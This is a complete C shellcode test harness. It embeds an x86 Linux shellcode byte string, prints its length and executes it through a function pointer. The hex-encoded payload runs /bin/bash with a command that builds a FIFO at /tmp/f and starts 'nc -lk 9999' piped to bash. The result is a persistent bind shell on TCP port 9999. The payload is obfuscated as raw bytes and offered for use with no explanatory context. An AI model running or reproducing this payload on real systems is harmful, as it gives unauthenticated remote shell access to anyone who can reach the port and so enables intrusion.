#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xd2\xb0\x0b\x52\x66\x68\x2d\x63\x89\xe7\x52\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x52\xeb\x06\x57\x53\x89\xe1\xcd\x80\xe8\xf5\xff\xff\xff\x20\x72\x6d\x20\x2d\x66\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x20\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x20\x2f\x62\x69\x6e\x2f\x6e\x63\x20\x2d\x6c\x6b\x20\x39\x39\x39\x39\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x66\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x26\x3e\x2f\x74\x6d\x70\x2f\x66";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
